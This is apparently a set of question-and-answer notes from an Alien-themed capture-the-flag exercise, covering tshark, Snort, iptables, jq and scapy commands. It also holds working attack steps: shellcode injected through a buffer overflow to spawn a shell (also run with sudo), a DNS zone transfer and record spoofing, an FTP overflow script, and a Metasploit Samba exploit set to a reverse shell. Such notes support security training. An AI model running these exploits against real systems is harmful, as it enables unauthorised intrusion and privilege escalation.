# Various Terminal commands

### If you don't know where to begin or what tool to use, what is a good place to start?
ptf @ https://github.com/alfredgamulo/ptf
```
sudo ptf
ptf> search hash
[*] Search results below:
modules/intelligence-gathering/hash_extender
modules/password-recovery/hashcat-legacy
modules/password-recovery/princeprocessor
modules/password-recovery/statsprocessor
modules/password-recovery/hashcat-utils
modules/password-recovery/check_hashes
modules/password-recovery/hashcat
modules/password-recovery/password_analysis_and_cracking_kit
modules/password-recovery/maskprocessor
ptf> use modules/intelligence-gathering/hash_extender

ptf:(modules/intelligence-gathering/hash_extender)>help
Available from main prompt: show modules, show <module>, search <name>, use <module>
Inside modules: show options, set <option>,run
Additional commands: back, help, ?, exit, quit
Update or Install: update, upgrade, install, run

ptf:(modules/intelligence-gathering/hash_extender)>install
```

### How do you find and follow a tcp stream with tshark?
```
tshark -r snort.log.pcap -Y "http.user_agent contains Xenomorph" -T fields -e tcp.stream
tshark -r snort.log.pcap -z follow,tcp,ascii,5
```

### What is an example snort rule to alert on traffic with certain content or user_agent?
```
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:'YO WTF'; content:'Xenomorph'; sid:1000001; rev:1;classtype:trojan-activity)
```
`pcre` can be used instead of `content` to perform a regular expression filter

### What is scalpel?
It's a way to use extract files from an image binary if you know the headers and footers of the file you're looking for. It works best if you use the real hex values that you're trying to find.

### How do you use dig to perform a domain transfer?
Check `/etc/bind/` for any information on what IP addresses are allowed to modify domains.
```
dig @127.0.0.1 norehca.planet axfr -b 127.34.243.1
```

### How do you use nsupdate to modify subdomain information?
Check `/etc/bind/` for any information on what IP addresses are allowed to modify domains.
```
$ nsupdate
> server 127.0.0.1
> local 127.34.0.1
> update delete  hive.norehca.planet. A
> update add hive.norehca.planet. 600 A 127.0.0.1
> send
```

### Dump of various iptables commands:
```
1. Set the default policies to DROP for 
   the INPUT,FORWARD and OUTPUT chains.

sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT DROP

2. Create a rule to LOG all new SSH 
   connection attempts.
   
sudo iptables -I OUTPUT -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j LOG --log-prefix "Outgoing SSH connection"
sudo iptables -I INPUT -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j LOG --log-prefix "Outgoing SSH connection"

3. Create a rule to ACCEPT all connections 
   that are ESTABLISHED,RELATED on the INPUT
   and the OUTPUT chains.

sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

4. Create a rule to allow only remote source 
   ip address 172.18.0.222 to access the local
   SSH server on (port 22).

sudo iptables -A INPUT -p tcp -s 172.18.0.222 --dport 22 -j ACCEPT

5. Create a rule to allow any remote ip to 
   access local tcp servers on ports 25 and 80.

sudo iptables -A INPUT -p tcp --dport 25 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEP

6. Create a rule applied to the INPUT chain
   to ACCEPT all traffic from the lo interface.

sudo iptables -A INPUT -i lo -j ACCEPT

7. Create a rule to allow UDP port 53 and TCP 
   port 80 connections going out (OUTPUT).

sudo iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
```

### How do you save and use cookies with cURL?
```
curl localhost/cache --cookie-jar cookie.txt
curl localhost/upload --cookie cookie.txt
```

### How do you get and delete files from an FTP server with cURL?
```
curl -u ftpuser:ftppass ftp://127.0.0.1/filename1 -O filename1
curl ftp://ftpuser:ftppass@localhost -Q "DELE xenomorph1"
```

### How do you analyze a pcap file with an SSL keylog file?
```
tshark -r <capture_file>  -Y <wireshark_filter>  -o ssl.keylog_file:client_random.log
```

### How can you use scapy to realign the ports for server and client so that tshark can analyze the file?
```
#!/usr/bin/python
from scapy.all import *

packets = rdpcap('covert_channel.pcap')
for packet in packets:
  if packet[IP].src == '10.124.245.32':
    packet[TCP].sport = 443
    packet[TCP].dport = 59292
  else:
    packet[TCP].sport = 59292
    packet[TCP].dport = 443

wrpcap('fixed_ports.pcap', packets)
```

### Give an example of using gdb and using a payload from shell-storm to pop a shell by overwriting EIP and directing code to run the payload:
```
weyuser@14c7b2eb3e7f:~$ gdb xeno_scanner.elf 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from xeno_scanner.elf...(no debugging symbols found)...done.
(gdb) r $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x90\xd6\xff\xffAAAAA")
Starting program: /home/weyuser/xeno_scanner.elf $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x90\xd6\xff\xffAAAAA")
Xenomorph Scanner. Testing DNA of user with specified $UID...
Storing your DNA at: 0xffffd690
User with UID " 1�Ph//shh/bin��PS��
                                   ̀ABCDEFGHIJKLMNOPQRST����AAAAA" is NOT infected with Xeno-DNA.
Program received signal SIGSEGV, Segmentation fault.
0xffffd690 in ?? ()
(gdb) info registers
eax            0x0      0
ecx            0x7fffffbb       2147483579
edx            0xf7fcd870       -134424464
ebx            0xffffd6f0       -10512
esp            0xffffd6c0       0xffffd6c0
ebp            0x54535251       0x54535251
esi            0xf7fcc000       -134430720
edi            0xf7fcc000       -134430720
eip            0xffffd690       0xffffd690
eflags         0x10286  [ PF SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb) r $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x91\xd6\xff\xffAAAAA")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/weyuser/xeno_scanner.elf $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x91\xd6\xff\xffAAAAA")
Xenomorph Scanner. Testing DNA of user with specified $UID...
Storing your DNA at: 0xffffd690
User with UID " 1�Ph//shh/bin��PS��
                                   ̀ABCDEFGHIJKLMNOPQRST����AAAAA" IS infected with xeno-DNA. Please report to the medical bay for immediate extraction
process 35 is executing new program: /bin/dash
$ ls
HELP  xeno_scanner.c  xeno_scanner.elf
$ whoami
weyuser
```

### After finding the correct payload, how can you execute a file with the payload?
```
weyuser@8914c8642587:~$ sudo ./xeno_scanner.elf $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAA\xb1\xd6\xff\xffAAAAAAAA")
```

### Give an example jq query to filter entries based on a field matching an array of names:
```
jq '.[]| select(.name.first | contains("Ellen","Ash","Dallas","Lambert","Brett","Kane","Parker")) ' crew.json
```

### Give an example jq query to combine fields and print them in CSV format:
```
jq -cr '.[]| select(.name.first | contains("Ellen","Ash","Dallas","Lambert","Brett","Kane","Parker")) | [.latitude,.longitude] | @csv' crew.json
```

### Give an example of a scripted FTP command:
```
#!/bin/bash
HOST='127.0.0.1'
USER='root'
PASSWD=$(python -c "print('pass'+10000*'A')")
ftp -n -v $HOST << EOT
user $USER $PASSWD
ls
EOT
```

### What command helps to find non-standard open ports?
```
nmap -sV --open -p10-4000 mine.wey-tech.com
```

### After finding an smbd from nmap, what executable can help uncover more info?
```
nmap <host> -sV -sC 
smbclient -L 10.3.3.45
smbclient //10.3.3.45/weytechshare -c ls
```
```
sudo msfconsole
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          10.3.3.45        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME  weytechshare     no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   3   Linux x86_64


msf5 exploit(linux/samba/is_known_pipename) > show payloads

Compatible Payloads
===================

   #   Name                                  Disclosure Date  Rank    Check  Description
   -   ----                                  ---------------  ----    -----  -----------
   0   generic/custom                                         normal  No     Custom Payload
   1   generic/shell_bind_tcp                                 normal  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                              normal  No     Generic Command Shell, Reverse TCP Inline
   3   linux/x64/exec                                         normal  No     Linux Execute Command
   4   linux/x64/meterpreter/bind_tcp                         normal  No     Linux Mettle x64, Bind TCP Stager
   5   linux/x64/meterpreter/reverse_tcp                      normal  No     Linux Mettle x64, Reverse TCP Stager
   6   linux/x64/pingback_bind_tcp                            normal  No     Linux x64 Pingback, Bind TCP Inline
   7   linux/x64/pingback_reverse_tcp                         normal  No     Linux x64 Pingback, Reverse TCP Inline
   8   linux/x64/shell/bind_tcp                               normal  No     Linux Command Shell, Bind TCP Stager
   9   linux/x64/shell/reverse_tcp                            normal  No     Linux Command Shell, Reverse TCP Stager
   10  linux/x64/shell_bind_ipv6_tcp                          normal  No     Linux x64 Command Shell, Bind TCP Inline (IPv6)
   11  linux/x64/shell_bind_tcp                               normal  No     Linux Command Shell, Bind TCP Inline
   12  linux/x64/shell_bind_tcp_random_port                   normal  No     Linux Command Shell, Bind TCP Random Port Inline
   13  linux/x64/shell_reverse_ipv6_tcp                       normal  No     Linux x64 Command Shell, Reverse TCP Inline (IPv6)
   14  linux/x64/shell_reverse_tcp                            normal  No     Linux Command Shell, Reverse TCP Inline

msf5 exploit(linux/samba/is_known_pipename) > set payload 9
payload => linux/x64/shell/reverse_tcp

```

### If you think you found an exploitable service, how can you search for it in metasploit?
```
nmap -sV -sC files.wey-tech.com

Starting Nmap 7.60 ( https://nmap.org ) at 2020-07-29 04:32 UTC
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for files.wey-tech.com (10.3.3.21)
Host is up (0.020s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5rc3
```
```
msf5 > search ProFTPD 1.3.5rc3

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   4  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   5  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution

```
